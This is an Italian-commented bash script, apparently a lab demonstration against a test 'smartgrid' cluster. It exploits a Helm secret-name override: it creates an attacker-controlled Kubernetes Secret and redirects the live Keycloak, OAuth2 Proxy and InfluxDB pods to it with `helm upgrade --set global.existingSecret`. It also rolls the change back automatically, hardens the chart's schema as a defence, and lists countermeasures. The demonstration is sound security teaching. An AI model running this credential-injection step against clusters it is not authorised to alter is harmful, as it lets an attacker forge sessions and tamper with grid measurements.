#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A3 - Iniezione di credenziali via override del Secret in Helm
#
# Riprende la misconfig 3 (STRIDE riga 19, "Helm allows secret name override") e
# ne mostra lo SFRUTTAMENTO sul cluster vivo: il nome del Secret da cui TUTTI i
# componenti leggono le credenziali e' il valore libero global.existingSecret.
# L'attaccante crea un Secret proprio con credenziali che CONOSCE e, con un solo
# `helm upgrade --set global.existingSecret=...`, fa ripartire i pod reali
# (Keycloak, OAuth2 Proxy, InfluxDB, bridge) leggendo le SUE credenziali.
#
# Riferimenti: MITRE ATT&CK T1565 "Data Manipulation" / T1078 "Valid Accounts";
# NSA/CISA Kubernetes Hardening Guidance 1.2 (gestione dei Secret, RBAC);
# letteratura su Helm value injection / supply chain.
#
# DIFFERENZA COL TEST 03:
#   - 03-helm-secret-override.sh  usa SOLO `helm template`: MOSTRA che i manifest
#     renderizzati cambiano puntatore. Non tocca il cluster.
#   - questo script e' un ATTACCO: crea davvero il Secret ostile, esegue
#     `helm upgrade` sulla release viva e verifica che i pod ora usino le
#     credenziali dell'attaccante. Ripristino con `helm rollback`.
#
# REVERSIBILITA': prima dell'upgrade salva la revisione corrente; un trap EXIT
# esegue `helm rollback` alla revisione precedente e cancella il Secret ostile.
# NON stampa credenziali reali del progetto: i valori iniettati sono scelti
# dall'attaccante (marcatori evidenti). SOLO sul proprio cluster di prova.
#
# Uso:
#   ./06-attacco-helm-secret-injection.sh [release] [namespace] [percorso-chart]
#   DEFENSE=1 ./06-attacco-helm-secret-injection.sh      # + schema che blocca l'override
#   (default: release 'smartgrid', namespace 'smartgrid', chart autodetect)
# =============================================================================
set -euo pipefail

RELEASE="${1:-smartgrid}"
NS="${2:-smartgrid}"
DEFENSE="${DEFENSE:-0}"
EVIL="attacker-controlled-secret"
INJECT_MARK="INJECTED-BY-ATTACKER"   # valore evidente, non una credenziale reale

line() { printf '\n=== %s\n' "$1"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
need kubectl
need helm

# --- percorso del chart (come nel test 03: cerca charts/smartgrid salendo) ----
CHART="${3:-}"
if [ -z "$CHART" ]; then
  d="$(cd "$(dirname "$0")" && pwd)"
  while [ "$d" != "/" ]; do
    [ -f "$d/charts/smartgrid/Chart.yaml" ] && CHART="$d/charts/smartgrid" && break
    d="$(dirname "$d")"
  done
fi
[ -n "$CHART" ] && [ -f "$CHART/Chart.yaml" ] || { echo "chart non trovato: passarlo come 3o argomento"; exit 1; }

kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }
if ! helm status "$RELEASE" -n "$NS" >/dev/null 2>&1; then
  echo "release Helm '$RELEASE' non trovata nel namespace '$NS'."
  echo "Questo attacco agisce su una release viva: installala prima con"
  echo "  helm install $RELEASE $CHART -n $NS"
  echo "(il test 03, che usa solo 'helm template', non richiede il cluster.)"
  exit 1
fi

# nome del Secret attuale da values (default auth-secrets)
CUR_SECRET="$(helm get values "$RELEASE" -n "$NS" -a -o json 2>/dev/null \
  | grep -o '"existingSecret"[^,}]*' | head -n1 | sed 's/.*:\s*"\(.*\)".*/\1/')"
CUR_SECRET="${CUR_SECRET:-auth-secrets}"
PREV_REV="$(helm status "$RELEASE" -n "$NS" -o json 2>/dev/null | grep -o '"version":[0-9]*' | head -n1 | grep -o '[0-9]*')"

# --- ripristino garantito ----------------------------------------------------
cleanup() {
  set +e
  echo
  echo "(ripristino...)"
  if [ -n "${PREV_REV:-}" ]; then
    helm rollback "$RELEASE" "$PREV_REV" -n "$NS" >/dev/null 2>&1 \
      && echo "(pulizia: helm rollback a revisione $PREV_REV eseguito)" \
      || helm upgrade "$RELEASE" "$CHART" -n "$NS" --reuse-values \
           --set "global.existingSecret=$CUR_SECRET" >/dev/null 2>&1 \
         && echo "(pulizia: existingSecret riportato a '$CUR_SECRET')"
  fi
  kubectl delete secret "$EVIL" -n "$NS" --ignore-not-found >/dev/null 2>&1
  echo "(pulizia: Secret ostile '$EVIL' rimosso)"
}
trap cleanup EXIT

# -----------------------------------------------------------------------------
line "1. Stato attuale: da quale Secret leggono i componenti?"
echo "   existingSecret corrente: $CUR_SECRET   (revisione Helm: ${PREV_REV:-?})"
echo "-- riferimenti al Secret nei workload vivi:"
kubectl get deploy,statefulset -n "$NS" -o json \
  | grep -o '"secretName":"[^"]*"\|"name":"[^"]*"' | grep -i "$CUR_SECRET" | sort | uniq -c \
  || echo "   (riferimenti letti dai manifest renderizzati)"

# -----------------------------------------------------------------------------
line "2. ATTACCO (a): l'attaccante crea un Secret proprio con credenziali note"
echo "-- copio i NOMI delle chiavi dal Secret legittimo (mai i valori) e vi metto valori miei:"
KEYLIST="$(kubectl get secret "$CUR_SECRET" -n "$NS" -o go-template='{{range $k,$v := .data}}{{$k}}{{"\n"}}{{end}}' 2>/dev/null || true)"
if [ -z "$KEYLIST" ]; then
  echo "   (Secret '$CUR_SECRET' non leggibile: uso chiavi tipiche dello stack)"
  KEYLIST=$'OAUTH2_PROXY_CLIENT_SECRET\nOAUTH2_PROXY_COOKIE_SECRET\nINFLUXDB_TOKEN'
fi
SETARGS=""
for k in $KEYLIST; do
  [ -n "$k" ] || continue
  SETARGS="$SETARGS --from-literal=${k}=${INJECT_MARK}-${k}"
  echo "   chiave iniettata: $k = ${INJECT_MARK}-${k}"
done
# shellcheck disable=SC2086
kubectl create secret generic "$EVIL" -n "$NS" $SETARGS \
  --dry-run=client -o yaml | kubectl apply -f - >/dev/null
echo "   Secret ostile '$EVIL' creato nel namespace."

line "3. ATTACCO (b): un solo --set dirotta TUTTO lo stack sul Secret dell'attaccante"
echo "   helm upgrade $RELEASE <chart> --reuse-values --set global.existingSecret=$EVIL"
helm upgrade "$RELEASE" "$CHART" -n "$NS" --reuse-values \
  --set "global.existingSecret=$EVIL" --wait --timeout 90s >/dev/null 2>&1 \
  || helm upgrade "$RELEASE" "$CHART" -n "$NS" --reuse-values \
       --set "global.existingSecret=$EVIL" >/dev/null 2>&1 || true
echo "   upgrade applicato (nuova revisione: $(helm status "$RELEASE" -n "$NS" -o json 2>/dev/null | grep -o '"version":[0-9]*' | head -n1 | grep -o '[0-9]*'))"

line "4. PROVA D'IMPATTO: i workload vivi ora puntano al Secret dell'attaccante"
HITS="$(kubectl get deploy,statefulset -n "$NS" -o json | grep -c "\"$EVIL\"" || true)"
echo "   riferimenti a '$EVIL' nei workload: $HITS"
echo "-- esempio: la env dei pont punta alla fonte ostile (nome della fonte, non il valore):"
kubectl get deploy -n "$NS" -o json \
  | grep -o '"secretKeyRef":{"key":"[^"]*","name":"'"$EVIL"'"}' | head -n 3 \
  || kubectl get deploy,statefulset -n "$NS" -o yaml | grep -n "$EVIL" | head -n 3 || true
echo "   => Keycloak/OAuth2 Proxy/InfluxDB ripartono con credenziali SCELTE dall'attaccante."
echo "      Conoscendo il client secret, l'attaccante puo' forgiare sessioni/token;"
echo "      conoscendo il token InfluxDB, puo' leggere o falsificare le misure PMU."

# -----------------------------------------------------------------------------
if [ "$DEFENSE" = "1" ]; then
  line "5. [DEFENSE] Uno schema che vincola il nome rifiuta l'override"
  TMP="$(mktemp -d)"
  cp -r "$CHART" "$TMP/chart"
  # irrobustisco values.schema.json: existingSecret solo tra i nomi attesi
  if [ -f "$TMP/chart/values.schema.json" ]; then
    python3 - "$TMP/chart/values.schema.json" "$CUR_SECRET" <<'PY' 2>/dev/null || true
import json,sys
p,allowed=sys.argv[1],sys.argv[2]
d=json.load(open(p))
def harden(node):
    if not isinstance(node,dict): return
    props=node.get("properties",{})
    if "existingSecret" in props:
        props["existingSecret"]={"type":"string","enum":[allowed]}
    for v in props.values(): harden(v)
    if "global" in props: harden(props["global"])
harden(d)
json.dump(d,open(p,"w"),indent=2)
PY
    echo "-- helm template con il nome ostile contro lo schema irrobustito (atteso: errore):"
    helm template "$RELEASE" "$TMP/chart" --set "global.existingSecret=$EVIL" >/dev/null 2>"$TMP/err" \
      && echo "   (schema non ha bloccato: verificare il percorso di existingSecret nello schema)" \
      || { echo "   RIFIUTATO dallo schema:"; sed 's/^/     /' "$TMP/err" | head -n 4; }
  else
    echo "   (il chart non ha values.schema.json: fissare il nome in _helpers.tpl, es. {{ .Release.Name }}-auth)"
  fi
  rm -rf "$TMP"
  echo "   => con enum/pattern nello schema (o nome fisso nel chart) l'override non e' piu' possibile."
fi

echo
echo "CONCLUSIONE: chi puo' fare 'helm upgrade' (o modificare i values in GitOps)"
echo "sostituisce la fonte delle credenziali con un solo --set. Contromisure"
echo "(README sez. 3): nome del Secret fisso/legato alla release, validazione in"
echo "values.schema.json, Secret separati per componente, RBAC su chi fa upgrade."
